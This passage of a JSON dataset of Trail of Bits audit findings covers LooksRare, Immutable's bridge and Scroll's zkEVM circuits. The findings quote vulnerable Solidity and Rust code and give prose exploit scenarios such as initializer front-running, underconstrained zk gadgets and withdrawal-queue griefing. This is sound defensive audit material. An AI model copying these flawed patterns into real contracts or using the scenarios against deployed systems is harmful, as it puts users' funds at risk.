        "body": "The LooksRare contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the LooksRare contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. isContract may behave unexpectedly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The LooksRare exchange relies on OpenZeppelins SignatureChecker library to verify signatures on-chain. This library, in turn, relies on the isContract function in the Address library to determine whether the signer is a contract or an externally owned account (EOA). However, in Solidity, there is no reliable way to denitively determine whether a given address is a contract, as there are several edge cases in which the underlying extcodesize function can return unexpected results. function isContract( address account) internal view returns ( bool ) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. uint256 size; assembly { size := extcodesize (account) } return size > 0; } Figure 11.1: The isContract function in Address.sol #L27-37 Exploit Scenario A maker order is created and signed by a smart contract wallet. While this order is waiting to be lled, selfdestruct is called on the contract. The call to extcodesize returns 0, causing isContract to return false. Even though the order was signed by an ERC1271-compatible contract, the verify method will attempt to validate the signers address as though it were signed by an EOA. Recommendations Short term, clearly document for developers that SignatureChecker.verify is not guaranteed to accurately distinguish between an EOA and a contract signer, and emphasize that it should never be used in a manner that requires such a guarantee. Long term, avoid adding or altering functionality that would rely on a guarantee that a signatures source remains consistent over time.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "12. tokenId and amount fully controlled by the order strategy when matching two orders ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "When two orders are matched, the strategy dened by the MakerOrder is called to check whether the order can be executed. function matchAskWithTakerBidUsingETHAndWETH ( OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk ) external payable override nonReentrant { [...] // Retrieve execution parameters ( bool isExecutionValid , uint256 tokenId , uint256 amount ) = IExecutionStrategy(makerAsk.strategy) .canExecuteTakerBid(takerBid, makerAsk); require (isExecutionValid, \"Strategy: Execution invalid\" ); [...] } Figure 12.1: matchAskWithTakerBidUsingETHAndWETH ( LooksRareExchange.sol#186-212 ) The strategy call returns a boolean indicating whether the order match can be executed, the tokenId to be sold, and the amount to be transferred. The LooksRareExchange contract does not verify these last two values, which means that the strategy has full control over them. function matchAskWithTakerBidUsingETHAndWETH ( OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk ) external payable override nonReentrant { [...] // Execution part 1/2 _transferFeesAndFundsWithWETH( makerAsk.strategy, makerAsk.collection, tokenId, makerAsk.signer, takerBid.price, makerAsk.minPercentageToAsk ); // Execution part 2/2 _transferNonFungibleToken(makerAsk.collection, makerAsk.signer, takerBid.taker, tokenId, amount); emit TakerBid( askHash, makerAsk.nonce, takerBid.taker, makerAsk.signer, makerAsk.strategy, makerAsk.currency, makerAsk.collection, tokenId, amount, takerBid.price ); } Figure 12.2: matchAskWithTakerBidUsingETHAndWETH ( LooksRareExchange.sol#217-228 ) This ultimately means that a faulty or malicious strategy can cause a loss of funds (e.g., by returning a dierent tokenId from the one that was intended to be sold or bought). Additionally, this issue may become problematic if strategies become trustless and are no longer developed or allowlisted by the LooksRare team. Exploit Scenario A faulty strategy, which returns a dierent tokenId than expected, is allowlisted in the protocol. Alice creates a new order using that strategy to sell one of her tokens. Bob matches Alices order, but because the tokenId is not validated before executing the order, he gets a dierent token than he intended to buy. Recommendations Short term, evaluate and document this behavior and use this documentation when integrating new strategies into the protocol. Long term, consider adding further safeguards to the LooksRareExchange contract to check the validity of the tokenId and the amount returned by the call to the strategy.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Risk of phishing due to data stored in maker order params eld ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The MakerOrder struct contains a params eld, which holds arbitrary data for each strategy. This storage of data may increase the chance that users could be phished. struct MakerOrder { bool isOrderAsk; // true --> ask / false --> bid address signer; // signer of the maker order address collection; // collection address uint256 price; // price (used as ) uint256 tokenId; // id of the token uint256 amount; // amount of tokens to sell/purchase (must be 1 for ERC721, 1+ for ERC1155) address strategy; // strategy for trade execution (e.g., DutchAuction, StandardSaleForFixedPrice) address currency; // currency (e.g., WETH) uint256 nonce; // order nonce (must be unique unless new maker order is meant to override existing one e.g., lower ask price) uint256 startTime; // startTime in timestamp uint256 endTime; // endTime in timestamp uint256 minPercentageToAsk; // slippage protection (9000 --> 90% of the final price must return to ask) bytes params; // additional parameters uint8 v; // v: parameter (27 or 28) bytes32 r; // r: parameter bytes32 s; // s: parameter } Figure 13.1: The MakerOrder struct in contracts/libraries/OrderTypes.sol#L12-29 In the Dutch auction strategy, the maker params eld denes the start price for the auction. When a user generates the signature, the UI must specify the purpose of params . function canExecuteTakerBid (OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk) external view override returns ( bool , uint256 , uint256 ) { } uint256 startPrice = abi.decode(makerAsk.params, ( uint256 )); uint256 endPrice = makerAsk.price; Figure 13.2: The canExecuteTakerBid function in contracts/executionStrategies/StrategyDutchAuction.sol#L39-L70 When used in a StrategyPrivateSale transaction, the params eld holds the buyer address that the private sale is intended for. function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk) external view override returns ( bool , uint256 , uint256 ) { // Retrieve target buyer address targetBuyer = abi.decode(makerAsk.params, ( address )); return ( ((targetBuyer == takerBid.taker) && (makerAsk.price == takerBid.price) && (makerAsk.tokenId == takerBid.tokenId) && (makerAsk.startTime <= block.timestamp ) && (makerAsk.endTime >= block.timestamp )), makerAsk.tokenId, makerAsk.amount ); } Figure 13.3: The canExecuteTakerBid function in contracts/executionStrategies/StrategyPrivateSale.sol Exploit Scenario Alice receives an EIP-712 signature request through MetaMask. Because the value is masked in the params eld, Alice accidentally signs an incorrect parameter that allows an attacker to match. Recommendations Short term, document the expected values for the params value for all strategies and add in-code documentation to ensure that developers are aware of strategy expectations. Long term, document the risks associated with o-chain signatures and always ensure that users are aware of the risks of signing arbitrary data.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Use of legacy openssl version in solidity-coverage plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The LooksRare codebase uses a version of solidity-coverage that relies on a legacy version of openssl to run. While this plugin does not alter protocol contracts deployed to production, the use of outdated security protocols anywhere in the codebase may be risky or prone to errors. Error in plugin solidity-coverage: Error: error:0308010C:digital envelope routines::unsupported Figure 14.1: Error raised by npx hardhat coverage Recommendations Short term, refactor the code to use a new version of openssl to prevent the exploitation of openssl vulnerabilities. Long term, avoid using outdated or legacy versions of dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "15. TypeScript compiler errors during deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "TypeScript throws an error while trying to compile scripts during the deployment process. scripts/helpers/deploy-exchange.ts:29:5 - error TS7053: Element implicitly has an 'any' type because expression of type 'string' can't be used to index type '{ mainnet: string; rinkeby: string; localhost: string; }'. No index signature with a parameter of type 'string' was found on type '{ mainnet: string; rinkeby: string; localhost: string; }'. 29 config.Fee.Standard[activeNetwork] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Figure 15.1: TypeScript error raised by npx hardhat run --network localhost scripts/hardhat/deploy-hardhat.ts In the config.ts le, the config object does not explicitly allow string types to be used as an index type for accessing its keys. Hardhat assigns a string type as the value of activeNetwork . As a result, TypeScript throws a compiler error when it tries to access a member of the config object using the activeNetwork value. Recommendations Short term, add type information to the config object that allows its keys to be accessed using string types. Long term, ensure that TypeScript can compile properly without errors in any and every potential context.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Initialization functions vulnerable to front-running ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf",
        "body": "Several implementation contracts have initialization functions that can be front-run, which would allow an attacker to incorrectly initialize the contracts. Due to the use of the delegatecall proxy pattern, the RootERC20Predicate and RootERC20PredicateFlowRate contracts (as well as other upgradeable contracts that are not in scope) cannot be initialized with a constructor, so they have initialize functions: function initialize ( address newStateSender , address newExitHelper , address newChildERC20Predicate , address newChildTokenTemplate , address nativeTokenRootAddress ) external virtual initializer { __RootERC20Predicate_init( newStateSender, newExitHelper, newChildERC20Predicate, newChildTokenTemplate, nativeTokenRootAddress ); } Figure 1.1: Front-runnable initialize function ( RootERC20Predicate.sol ) function initialize ( address superAdmin , address pauseAdmin , address unpauseAdmin , address rateAdmin , address newStateSender , address newExitHelper , address newChildERC20Predicate , address newChildTokenTemplate , address nativeTokenRootAddress ) external initializer { __RootERC20Predicate_init( newStateSender, newExitHelper, newChildERC20Predicate, newChildTokenTemplate, nativeTokenRootAddress ); __Pausable_init(); __FlowRateWithdrawalQueue_init(); _setupRole(DEFAULT_ADMIN_ROLE, superAdmin); _setupRole(PAUSER_ADMIN_ROLE, pauseAdmin); _setupRole(UNPAUSER_ADMIN_ROLE, unpauseAdmin); _setupRole(RATE_CONTROL_ROLE, rateAdmin); } Figure 1.2: Front-runnable initialize function ( RootERC20PredicateFlowRate.sol ) An attacker could front-run these functions and initialize the contracts with malicious values. The documentation provided by the Immutable team indicates that they are aware of this issue and how to mitigate it upon deployment of the proxy or when upgrading the implementation. However, there do not appear to be any deployment scripts to demonstrate that this will be correctly done in practice, and the codebases tests do not cover upgradeability. Exploit Scenario Bob deploys the RootERC20Predicate contract. Eve deploys an upgradeable version of the ExitHelper contract and front-runs the RootERC20Predicate initialization, passing her contracts address as the exitHelper argument. Due to a lack of post-deployment checks, this issue goes unnoticed and the protocol functions as intended for some time, drawing in a large amount of deposits. Eve then upgrades the ExitHelper contract to allow her to arbitrarily call the onL2StateReceive function of the RootERC20Predicate contract, draining all assets from the bridge. Recommendations Short term, either use a factory pattern that will prevent front-running the initialization, or ensure that the deployment scripts have robust protections against front-running attacks. Long term, carefully review the Solidity documentation , especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Lack of lower and upper bounds for system parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf",
        "body": "The lack of lower and upper bound checks when setting important system parameters could lead to a temporary denial of service, allow users to complete their withdrawals prematurely, or otherwise hinder the expected performance of the system. The setWithdrawalDelay function of the RootERC20PredicateFlowRate contract can be used by the rate control role to set the amount of time that a user needs to wait before they can withdraw their assets from the root chain of the bridge. // RootERC20PredicateFlowRate.sol function setWithdrawalDelay ( uint256 delay ) external onlyRole(RATE_CONTROL_ROLE) { _setWithdrawalDelay(delay); } // FlowRateWithdrawalQueue.sol function _setWithdrawalDelay ( uint256 delay ) internal { withdrawalDelay = delay; emit WithdrawalDelayUpdated(delay); } Figure 2.1: The setter functions for the withdrawalDelay state variable ( RootERC20PredicateFlowRate.sol and FlowRateWithdrawalQueue.sol ) The withdrawalDelay variable value is applied to all currently pending withdrawals in the system, as shown in the highlighted lines of gure 2.2. function _processWithdrawal ( address receiver , uint256 index ) internal returns ( address withdrawer , address token , uint256 amount ) { // ... // Note: Add the withdrawal delay here, and not when enqueuing to allow changes // to withdrawal delay to have effect on in progress withdrawals. uint256 withdrawalTime = withdrawal.timestamp + withdrawalDelay; // slither-disable-next-line timestamp if ( block.timestamp < withdrawalTime) { // solhint-disable-next-line not-rely-on-time revert WithdrawalRequestTooEarly( block.timestamp , withdrawalTime); } // ... } Figure 2.2: The function completes a withdrawal from the withdrawal queue if the withdrawalTime has passed. ( FlowRateWithdrawalQueue.sol ) However, the setWithdrawalDelay function does not contain any validation on the delay input parameter. If the input parameter is set to zero, users can skip the withdrawal queue and immediately withdraw their assets. Conversely, if this variable is set to a very high value, it could prevent users from withdrawing their assets for as long as this variable is not updated. The setRateControlThreshold allows the rate control role to set important token parameters that are used to limit the amount of tokens that can be withdrawn at once, or in a certain time period, in order to mitigate the risk of a large amount of tokens being bridged after an exploit. // RootERC20PredicateFlowRate.sol function setRateControlThreshold ( address token , uint256 capacity , uint256 refillRate , uint256 largeTransferThreshold ) external onlyRole(RATE_CONTROL_ROLE) { _setFlowRateThreshold(token, capacity, refillRate); largeTransferThresholds[token] = largeTransferThreshold; } // FlowRateDetection.sol function _setFlowRateThreshold ( address token , uint256 capacity , uint256 refillRate ) internal { if (token == address ( 0 )) { revert InvalidToken(); } if (capacity == 0 ) { revert InvalidCapacity(); } if (refillRate == 0 ) { revert InvalidRefillRate(); } Bucket storage bucket = flowRateBuckets[token]; if (bucket.capacity == 0 ) { bucket.depth = capacity; } bucket.capacity = capacity; bucket.refillRate = refillRate; } Figure 2.3: The function sets the system parameters to limit withdrawals of a specic token. ( RootERC20PredicateFlowRate.sol and FlowRateDetection.sol ) However, because the _setFlowRateThreshold function of the FlowRateDetection contract is missing upper bounds on the input parameters, these values could be set to an incorrect or very high value. This could potentially allow users to withdraw large amounts of tokens at once, without triggering the withdrawal queue. Exploit Scenario Alice attempts to update the withdrawalDelay state variable from 24 to 48 hours. However, she mistakenly sets the variable to 0 . Eve uses this setting to skip the withdrawal queue and immediately withdraws her assets. Recommendations Short term, determine reasonable lower and upper bounds for the setWithdrawalDelay and setRateControlThreshold functions, and add the necessary validation to those functions. Long term, carefully document which system parameters are congurable and ensure they have adequate upper and lower bound checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. RootERC20Predicate is incompatible with nonstandard ERC-20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf",
        "body": "The deposit and depositTo functions of the RootERC20Predicate contract are incompatible with nonstandard ERC-20 tokens, such as tokens that take a fee on transfer. The RootERC20Predicate contract allows users to deposit arbitrary tokens into the root chain of the bridge and mint the corresponding token on the child chain of the bridge. Users can deposit their tokens by approving the bridge for the required amount and then calling the deposit or depositTo function of the contract. These functions will call the internal _depositERC20 function, which will perform a check to ensure the token balance of the contract is exactly equal to the balance of the contract before the deposit, plus the amount of tokens that are being deposited. function _depositERC20 (IERC20Metadata rootToken, address receiver , uint256 amount ) private { uint256 expectedBalance = rootToken.balanceOf( address ( this )) + amount; _deposit(rootToken, receiver, amount); // invariant check to ensure that the root token balance has increased by the amount deposited // slither-disable-next-line incorrect-equality require ((rootToken.balanceOf( address ( this )) == expectedBalance), \"RootERC20Predicate: UNEXPECTED_BALANCE\" ); } Figure 3.1: Internal function used to deposit ERC-20 tokens to the bridge ( RootERC20Predicate.sol ) However, some nonstandard ERC-20 tokens will take a percentage of the transferred amount as a fee. Due to this, the require statement highlighted in gure 3.1 will always fail, preventing users from depositing such tokens. Recommendations Short term, clearly document that nonstandard ERC-20 tokens are not supported by the protocol. If the team determines that they want to support nonstandard ERC-20 implementations, additional logic should be added into the _deposit function to determine the actual token amount received by the contract. In this case, reentrancy protection may be needed to mitigate the risks of ERC-777 and similar tokens that implement callbacks whenever tokens are sent or received. Long term, be aware of the idiosyncrasies of ERC-20 implementations. This standard has a history of misuses and issues. References   Incident with non-standard ERC20 deationary tokens d-xo/weird-erc20",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Lack of event generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf",
        "body": "Multiple critical operations do not emit events. This creates uncertainty among users interacting with the system. The setRateControlThresholds function in the RootERC20PredicateFlowRate contract does not emit an event when it updates the largeTransferThresholds critical storage variable for a token (gure 4.1). However, having an event emitted to reect such a change in the critical storage variable may allow other system and o-chain components to detect suspicious behavior in the system. Events generated during contract execution aid in monitoring, baselining behavior, and detecting suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions, and malfunctioning contracts and attacks could go undetected. function setRateControlThreshold ( 1 address token , 2 uint256 capacity , 3 uint256 refillRate , 4 5 uint256 largeTransferThreshold 6 ) external onlyRole(RATE_CONTROL_ROLE) { 7 8 9 } _setFlowRateThreshold(token, capacity, refillRate); largeTransferThresholds[token] = largeTransferThreshold; Figure 4.1: The setRateControlThreshold function ( RootERC20PredicateFlowRate.sol #L214-L222 ) In addition to the above function, the following function should also emit events:  The setAllowedZone function in seaport/contracts/ImmutableSeaport.sol Recommendations Short term, add events for all functions that change state to aid in better monitoring and alerting. Long term, ensure that all state-changing operations are always accompanied by events. In addition, use static analysis tools such as Slither to help prevent such issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Withdrawal queue can be forcibly activated to hinder bridge operation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf",
        "body": "The withdrawal queue can be forcibly activated to impede the proper operation of the bridge. The RootERC20PredicateFlowRate contract implements a withdrawal queue to more easily detect and stop large withdrawals from passing through the bridge (e.g., bridging illegitimate funds from an exploit). A transaction can enter the withdrawal queue in four ways: 1. If a tokens ow rate has not been congured by the rate control admin 2. If the withdrawal amount is larger than or equal to the large transfer threshold for that token 3. If, during a predened period, the total withdrawals of that token are larger than the dened token capacity 4. If the rate controller manually activates the withdrawal queue by using the activateWithdrawalQueue function In cases 3 and 4 above, the withdrawal queue becomes active for all tokens, not just the individual transfers. Once the withdrawal queue is active, all withdrawals from the bridge must wait a specied time before the withdrawal can be nalized. As a result, a malicious actor could withdraw a large amount of tokens to forcibly activate the withdrawal queue and hinder the expected operation of the bridge. Exploit Scenario 1 Eve observes Alice initiating a transfer to bridge her tokens back to the mainnet. Eve also initiates a transfer, or a series of transfers to avoid exceeding the per-transaction limit, of sucient tokens to exceed the expected ow rate. With Alice unaware she is being targeted for grieng, Eve can execute her withdrawal on the root chain rst, cause Alices withdrawal to be pushed into the withdrawal queue, and activate the queue for every other bridge user. Exploit Scenario 2 Mallory has identied an exploit on the child chain or in the bridge itself, but because of the withdrawal queue, it is not feasible to exltrate the funds quickly enough without risking getting caught. Mallory identies tokens with small ow rate limits relative to their price and repeatedly triggers the withdrawal queue for the bridge, degrading the user experience until Immutable disables the withdrawal queue. Mallory takes advantage of this window of time to carry out her exploit, bridge the funds, and move them into a mixer. Recommendations Short term, explore the feasibility of withdrawal queues on a per-token basis instead of having only a global queue. Be aware that if the ow rates are set low enough, an attacker could feasibly use them to grief all bridge users. Long term, develop processes for regularly reviewing the conguration of the various token buckets. Fluctuating token values may unexpectedly make this type of grieng more feasible. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. ModGadget is underconstrained and allows incorrect MULMOD operations to be proven ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The ModGadget circuit computes the modulo operation, a mod n, with the caveat that the result should be 0 whenever n is 0. However, an incorrect constraint allows a proof that that a mod 0 == a. This causes incorrect EVM semantics for the MULMOD opcode, allowing an attacker to prove that a*b mod 0 == a*b. According to the EVM semantics, the correct result is 0. The ModGadget circuit implementation uses a witness value, a_or_zero, that is supposed to take the value of a when n is nonzero or 0 when n is 0. The code comments indicate that the following constraint ensures that a_or_zero satises this condition, but the constraint also allows the case a_or_zero == a and n == 0: /// Constraints for the words a, n, r: /// a mod n = r, if n!=0 /// r = 0, if n==0 /// /// We use the auxiliary a_or_zero word, whose value is constrained to be: /// a_or_zero = a if n!=0, 0 if n==0. This allows to use the equation /// k * n + r = a_or_zero to verify the modulus, which holds with r=0 in the /// case of n=0. Unlike the usual k * n + r = a, which forces r = a when n=0, /// this equation assures that r<n or r=n=0. ... impl<F: Field> ModGadget<F> { pub(crate) fn construct(cb: &mut ConstraintBuilder<F>, words: [&util::Word<F>; 3]) -> Self { let (a, n, r) = (words[0], words[1], words[2]); let k = cb.query_word_rlc(); let a_or_zero = cb.query_word_rlc(); let n_is_zero = IsZeroGadget::construct(cb, sum::expr(&n.cells)); let a_or_is_zero = IsZeroGadget::construct(cb, sum::expr(&a_or_zero.cells)); let mul_add_words = MulAddWordsGadget::construct(cb, [&k, n, r, &a_or_zero]); let eq = IsEqualGadget::construct(cb, a.expr(), a_or_zero.expr()); let lt = LtWordGadget::construct(cb, r, n); // Constrain the aux variable a_or_zero to be =a or =0 if n==0: // (a == a_or_zero) ^ (n == 0 & a_or_zero == 0) cb.add_constraint( \" (1 - (a == a_or_zero)) * ( 1 - (n == 0) * (a_or_zero == 0)\", (1.expr() - eq.expr()) * (1.expr() - n_is_zero.expr() * a_or_is_zero.expr()), ); Figure 1.1: evm_circuit/util/math_gadget/modulo.rs#L10-L44 To correctly constrain the a_or_zero variable, rewrite the constraint as the following: [1 - ((n==0)*(a_or_zero==0) + (1 - n==0) * (a_or_zero == a)))] == 0 This constraint results in the following truth table: Figure 1.2 shows how ModGadget is used to constrain the results of the MULMOD opcode. Since the constraints are satised by setting a_reduced == a instead of a_reduced == 0, when    < 2 , the result can be set to 256    by setting  1 =  2 =  = 0,  =  =    . // 1. k1 * n + a_reduced == a let modword = ModGadget::construct(cb, [&a, &n, &a_reduced]); // 2. a_reduced * b + 0 == d * 2^256 + e let mul512_left = MulAddWords512Gadget::construct(cb, [&a_reduced, &b, &d, &e], None); // 3. k2 * n + r == d * 2^256 + e let mul512_right = MulAddWords512Gadget::construct(cb, [&k, &n, &d, &e], Some(&r)); // (r < n ) or n == 0 let n_is_zero = IsZeroGadget::construct(cb, sum::expr(&n.cells)); let lt = LtWordGadget::construct(cb, &r, &n); cb.add_constraint( \" (1 - (r < n) - (n==0)) \", 1.expr() - lt.expr() - n_is_zero.expr(), ); Figure 1.2: zkevm-circuits/src/evm_circuit/execution/mulmod.rs#5873 Exploit Scenario A bridge uses the Scroll zkEVM to track the current state of Ethereum. A malicious prover generates a proof of execution for a transaction involving the MULMOD instruction with  = 0 results of which will not match the correct EVM semantics, leading to state divergence and loss of funds. as described above. The prover submits that proof, the , and sets the result to    Recommendations Short term, x the constraint; extend the assign function to receive the a_or_zero witness. Add tests for this nding. Long term, add determinacy testing to any gadgets that constrain nondeterministic witnesses.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. The RlpU64Gadget is underconstrained when is_lt_128 is false ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The RlpU64Gadget constrains witness values to match the output of a correct RLP encoding. Since the length and value of the RLP-encoded value depend on the value being less than 128, the is_lt_128 ag is part of the witness. A range check ensures that if is_lt_128 is true, then the value is actually below 128. However, there is no constraint ensuring that value is above 127 when is_lt_128 is false: let is_lt_128 = cb.query_bool(); cb.condition(is_lt_128.expr(), |cb| { cb.range_lookup(value, 128); }); Figure 2.1: evm_circuit/util/math_gadget/rlp.rs#L67-L70 This means that a malicious prover could have a value smaller than 128 but set is_lt_128 to false, leading to an incorrect length and RLP-encoded output. Exploit Scenario A malicious prover interprets two bytes in an RLP-serialized data structure as a value less than 128, causing later elds in the data structure to be deserialized starting at an incorrect oset. The prover then uses this incorrectly deserialized data structure to prove an invalid state transition, leading to state divergence and potential loss of funds. Recommendations Short term, add a constraint to ensure that the value is above 127 when is_lt_128 is false. Long term, add negative tests ensuring that mismatched witnesses value and is_lt_128 do not satisfy the circuit constraints.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. The BLOCKHASH opcode is underconstrained and allows the hash of any block to be computed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The BLOCKHASH opcode returns the hash of the block identied by the stack argument, block_number, provided that it is one of the 256 most recent complete blocks. However, the implementation allows a malicious prover to provide a nonzero result even when the provided block number is not among the 256 most recent blocks, contradicting the EVM specication. To validate that block_number is among the 256 most recent blocks, the implementation checks that current_block_number - block_number < 257, where current_block_number is supposed to be the block number of the current block. However, current_block_number is unconstrained and could take any value: impl<F: Field> ExecutionGadget<F> for BlockHashGadget<F> { const NAME: &'static str = \"BLOCKHASH\"; const EXECUTION_STATE: ExecutionState = ExecutionState::BLOCKHASH; fn configure(cb: &mut ConstraintBuilder<F>) -> Self { let current_block_number = cb.query_cell(); let block_number = WordByteCapGadget::construct(cb, current_block_number.expr()); cb.stack_pop(block_number.original_word()); // FIXME // cb.block_lookup( // // // // ); BlockContextFieldTag::Number.expr(), cb.curr.state.block_number.expr(), current_block_number.expr(), let block_hash = cb.query_word_rlc(); let diff_lt = LtGadget::construct( cb, current_block_number.expr(), (NUM_PREV_BLOCK_ALLOWED + 1).expr() + block_number.valid_value(), Figure 3.1: zkevm-circuits/src/evm_circuit/execution/blockhash.rs#L33-L49 A malicious prover could provide an invalid current_block_number and return the hash of any block present in the block lookup table, independent of its block number. Exploit Scenario A malicious prover generates a proof of execution for a transaction involving the BLOCKHASH opcode that results in a nonzero hash for an older block. The prover submits that proof, the results of which will not match the correct EVM semantics, leading to state divergence and loss of funds. Recommendations Short term, add the missing lookup constraint for the current_block_number witness. Long term, track and triage FIXME and TODO items in a centralized issue tracking system, such as GitHub issues. Add failing tests when security-relevant TODO items are identied.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. zkevm-circuits crate depends on an outdated version of halo2-ecc ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The zkevm-circuits crate depends on the halo2-ecc library in Scrolls fork of halo2-lib, which provides halo2 circuits for elliptic curve and nite eld operations. As illustrated in gure 4.1, this crate depends on the halo2-ecc-snark-verifier-0323 tag, which currently points to commit d24871338ade7dd56362de517b718ba14f3e7b90. halo2-base = { git = \"https://github.com/scroll-tech/halo2-lib\", branch = \"halo2-ecc-snark-verifier-0323\", default-features=false, features=[\"halo2-pse\",\"display\"] } halo2-ecc = { git = \"https://github.com/scroll-tech/halo2-lib\", branch = \"halo2-ecc-snark-verifier-0323\", default-features=false, features=[\"halo2-pse\",\"display\"] } Figure 4.1: zkevm-circuits/Cargo.toml#3233 The Scroll fork of halo2-lib is closely related to the upstream halo2-lib library. In particular, the v0.3.0 version of halo2-ecc (commit c31a30bcaff384b0c3aa7c823dd343f5c85da69e) has a common ancestor commit of 4338af81bb2de4f278467e5c484e067c064cc66b with the Scroll version. Figure 4.2: The Git commit history of halo2-lib with the common ancestor of the minimize-diff and upgrade-v0.3.0 branches highlighted The upstream library has various xes and improvements that should be incorporated. Some notable existing xes include the following:  FpChip::assert_equal has had a soundness-related typo xed (PR #18).  ecdsa_verify_no_pubkey_check no longer rejects certain valid signatures (PR #36). While FpChip::assert_equal does not currently appear to be used, the SignVerifyChip circuit uses the ecdsa_verify_no_pubkey_check function, as shown in gure 4.3. // returns the verification result of ecdsa signature // // WARNING: this circuit does not enforce the returned value to be true // make sure the caller checks this result! let ecdsa_is_valid = ecdsa_verify_no_pubkey_check::<F, Fp, Fq, Secp256k1Affine>( &ecc_chip.field_chip, ctx, &pk_assigned, &integer_r, &integer_s, &msg_hash, 4, 4, ); Figure 4.3: zkevm-circuits/src/tx_circuit/sign_verify.rs#386399 SignVerify is then used to check signatures on EVM transactions, as shown in gure 4.4, and because of the pre-patch behavior, an adversary can generate a correctly signed transaction that will nevertheless fail signature verication. #[cfg(feature = \"enable-sign-verify\")] { let assigned_sig_verifs = self.sign_verify .assign(&config.sign_verify, layouter, &sign_datas, challenges)?; self.sign_verify.assert_sig_is_valid( &config.sign_verify, layouter, assigned_sig_verifs.as_slice(), )?; self.assign( config, challenges, layouter, assigned_sig_verifs, Vec::new(), &padding_txs, )?; } Figure 4.4: zkevm-circuits/src/tx_circuit.rs#1804 Exploit Scenario An adversary creates a transaction with a valid signature that the old implementation would reject and submits it to Ethereum. Ethereum accepts the transaction, but the Scroll zkEVM is unable to accept it, stalling the zkEVM and creating a denial of service that may freeze user funds. Recommendations Short term, review the security implications of this outdated version of halo2-ecc on the zkEVM codebase. Then, either update to a more recent version of halo2-lib that incorporates upstream xes or backport those xes to Scrolls fork. Long term, keep all dependencies up to date whenever possible. For any dependencies that have been forked from the upstream version, develop a plan to port any upstream security updates onto that fork.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
